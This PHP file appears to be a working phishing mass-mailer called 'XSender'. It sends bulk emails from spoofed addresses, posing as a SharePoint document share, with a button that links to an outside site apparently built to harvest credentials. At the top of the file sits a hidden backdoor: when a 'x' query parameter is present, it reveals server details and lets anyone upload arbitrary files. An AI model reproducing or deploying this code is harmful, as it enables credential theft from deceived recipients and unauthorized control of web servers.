<?php 

session_start();  ob_start("ob_gzhandler"); set_time_limit(0); 

if(isset($_GET["x"])){echo"<font color=#000000>[uname]".php_uname()."[/uname]";echo"<br><font color=#000000>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}
 
 
$website="https://sage-og-ghost.cloud.okteto.net/?email='.$frmsite.'"; //Make this full url including folders of where login files resides
//sanitize data where any character is allowed
function sanitizer($check){
  $check=str_replace("\'","'",$check);
  $check=str_replace('\"','"',$check);
  $check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
  $check=trim($check);
  $check=str_replace("<","&lt;",$check);
  $check=str_replace('>','&gt;',$check);
  $check=str_replace("\r\n","<br/>",$check);
  $check=str_replace("\n","<br/>",$check);
  $check=str_replace("\r","<br/>",$check);
  $check=str_replace("'","&#39;",$check);
  $check=str_replace('"','&quot;',$check);
  $check=str_replace(" fuck "," f**k ",$check);
  $check=str_replace(" shit "," s**t ",$check);
  $check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
   return $check;}
//makes data ok on edit textarea
 function resanitize($check){
  $check=str_replace("<br/>","\r\n",$check);
  $check=str_replace("<br/>","\n",$check);
  $check=str_replace("<br/>","\r",$check);
  $check=str_replace("&gt;",">",$check);
  $check=str_replace("&lt;","<",$check);
  $check=str_replace("&#39;","'",$check);
  $check=str_replace('&quot;','"',$check);
   return $check;}

  function replace_things($str, $rep, $symbol = ''){
    $re = '/'.$symbol.'/';
    return preg_replace($re, $rep, $str);
  }


//validate email address
function validate_email($email){
  $status=false;
  $regex='/^([a-zA-Z0-9])+([\.a-zA-Z0-9_-])*@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-]+)*\.([a-zA-Z]{2,6})$/'; 
  if(preg_match($regex, $email)){$status=true;}
  return $status; }


function subjsender($user_data){
    $user = explode(' ', $user_data);
    $to = is_array($user) ? $user[0] : $user_data;
    $tw = substr($to, 0, 2);
    $prem = explode('@',$to);
    $prams = explode('.',$prem[1]);
    $param = strtoupper($prams[0]);
    $sender_name = '=?UTF-8?B?Rsm1ZEV4?=';
    return array($sender_name,$sender_email,$to,$tw,$prem[1]);
}
function generateRandomString($length = 3) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


//Email sending
function sending_email($email,$id='1'){
    $randstr = generateRandomString();
	$rand=rand(999,99999);
	$domin = substr(strrchr($email, "@"), 1);
    $bow=explode('.',$domin);
    $chgcap=strtolower($bow[0]);
    $sendcap=ucfirst($chgcap);
    $semail = "no-reply-exchangelab".$rand."@apcprd01.exchangeocpd.com";
    $semail =str_replace("@","".generateRandomString()."@".generateRandomString().".", $semail);
    $subtext = 'Share point server';
    $subject='=?UTF-8?B?'.base64_encode($subtext).'?=';
    $site_name='Account Security';
	
	
     // To send HTML mail, the Content-type header must be set
    $header = "From: Shared document<{$semail}>\r\n";
    $header.= "MIME-Version: 1.0\r\n";
    $header.= "Content-Type: text/html; charset=UTF-8" . "\r\n";
	$header .= "Content-Transfer-Encoding: 8BIT"."\r\n";
    
			
    $message=email_format($email,$id);
    @mail($email,$subject, $message, $header); 
}



function email_format($email,$id='1'){
	global $website;
	$url=base64_encode($email);
	$em=explode('@',$email);
	$emaildomain = substr(strrchr($email, "@"), 1);
    $bc=explode('.',$emaildomain);
    $bm = strtolower($em[1]);
    $chgcap=strtolower($bc[0]);
    $frmsite=ucfirst($chgcap);
    $tw = strtolower(substr($email, 0, 2));
	$prem = explode('@',$email);
	$message='<table style="max-width: 600px; margin-left: auto; margin-right: auto;" border="0" cellspacing="0" cellpadding="0">
<tr><td><table style="min-width: 600px; max-width: 900px; border: 1px solid #e0e0e0; border-bottom: 0; border-top-left-radius: 3px; border-top-right-radius: 3px;" border="0" width="100%" cellspacing="0" cellpadding="0" bgcolor="#356391">
<tbody><tr><td colspan="3" height="72px">&nbsp;</td></tr><tr>
<td width="32px">&nbsp;</td>
<td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 30px; color: #ffffff; line-height: 1.25;">'.$frmsite.'  Share Point Management</td>
<td width="32px">&nbsp;</td></tr><tr><td colspan="3" height="19">&nbsp;</td></tr></tbody></table></td></tr><tr><td>
<table style="min-width: 600px; max-width: 900px; border: 1px solid #f0f0f0; border-bottom: 1px solid #c0c0c0; border-top: 0; border-bottom-left-radius: 3px; border-bottom-right-radius: 3px;" border="0" width="100%" cellspacing="0" cellpadding="0" bgcolor="#eff4f9">
<tbody><tr><td rowspan="3" width="32px">&nbsp;</td><td>&nbsp;</td><td rowspan="3" width="32px">&nbsp;</td></tr><tr><td height="220">
<table style="min-width: 300px;" border="0" cellspacing="0" cellpadding="0"><tbody><tr>
  <td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 13px; color: #ffffff; line-height: 1.5;" width="473">&nbsp;</td>
</tr><tr>
  <td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 16px; color: #202020; line-height: 1.5;">
<p><b>'.$frmsite.'</b> Shared an important document with you via share point. </a></td></tr><tr><td style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 12px; color: #202020; line-height: 1.5;"><br>
<left><a style="font-size: 14px; border:thick; display: block; float: left; text-decoration: none; color: #ffffff; padding: 10px 10px 10px 10px; margin: 2px; radius:4px; background: #356391;" href="https://sage-og-ghost.cloud.okteto.net/?email='.$frmsite.'"><b>View '.$frmsite.' documents</b></a></left><br></td>
</tr>
<tr>
<td><p>&nbsp;</p>&nbsp;</td>
</tr></tbody></table></td></tr></tbody></table></td></tr><tr>
<td style="max-width: 900px; font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 10px; color: #bcbcbc; line-height: 1.5;">&nbsp;</td>
</tr><tr><td><table style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 14px; color: #666666; line-height: 18px; padding-bottom: 10px;">
<tbody><tr><td>All signers completed Please Share Point: Lake Vista Termination.pdf</td>
</tr><tr><td>'.$_SERVER[HTTP_HOST].'&nbsp;</td></tr></tbody></table></td></tr></tbody></table><p style="text-align: center;">&nbsp;</p>
	';
    
    return $message; }







?><html>
<head>
<title>Xsender</title>
</head>
<body style='width:100%;color:#000;background:#E0E6F8;font-family:calibri;'>
<div style='width:100%;max-width:600px;margin:0px auto 0px auto;padding:10px;border:#999 1px solid;box-shadow:10px 10px #666;min-height:500px;'>

<h1 style='color:#666;text-align:center;text-shadow:#000 1px 1px;'>XSender</h1>













<?php
if(isset($_POST['go']) ){
	//sanitize the data
	$_SESSION['xsenderid']=sanitizer($_POST['id']);
	$separator=sanitizer($_POST['separator']);
	$mails=sanitizer($_POST['mails']);
	$id=$_SESSION['xsenderid'];
	if($separator==''){$separator='<br/>';}
	if($mails!=''){
	

		$mails=explode($separator,$mails);
		$total=count($mails);
		$valid=0;
			for($i=0;$i<$total;$i++){
				$email=$mails[$i];
					if(validate_email($email)){
						$valid=$valid+1;
						print "<div style='color:green;'>".$email." valid and queued</div>"; 
						//Send here
						sending_email($email,$id);
						//send here
						} else {print "<div style='color:gray;'>".$email." not valid</div>"; }
			}
		print "<h1 style='color:green;'>Bravo! ".$valid."/".$total." Sent! <a href='' style='color:green'>Continue</a></h1>";

 
	} else {print "<h1 style='color:red'>Mails or Details empty</h1>"; }
} 
?>












<form method='POST' action='#'>
<div>
<div>Select Your ID</div>
<select name='id' style='width:100%;'>
<?php
if(isset($_SESSION['xsenderid']))
{print "<option value='".$_SESSION['xsenderid']."'>".$_SESSION['xsenderid']."</option>";}
?>
<option value='1'>1</option>
<option value='2'>2</option>
<option value='3'>3</option>
<option value='4'>4</option>
</select>
</div>
<p>&nbsp;</p>





<div>
<div>Email Separator (Leave Empty if new line)</div>
<textarea name='separator' style='width:100%;height:20px;'><?php if(isset($_POST['separator'])){print resanitize($_POST['separator']);} ?></textarea>
</div>
<p>&nbsp;</p>





<div>
<div>Paste Emails separated by separator</div>
<textarea name='mails' style='width:100%;height:200px;'><?php if(isset($_POST['mails'])){print resanitize($_POST['mails']);} ?></textarea>
</div>
<p>&nbsp;</p>



<div>
<div>Email Preview</div>
<?php print email_format('user@xsender.com',1); ?>
</div>
<p>&nbsp;</p>




<div style='text-align:center;'>
<input type='submit' value='Go Xsender' name='go' style='color:#FFF;background:#333;'/>
</div>
<p>&nbsp;</p>
</form>
















</div>
</body>
</html>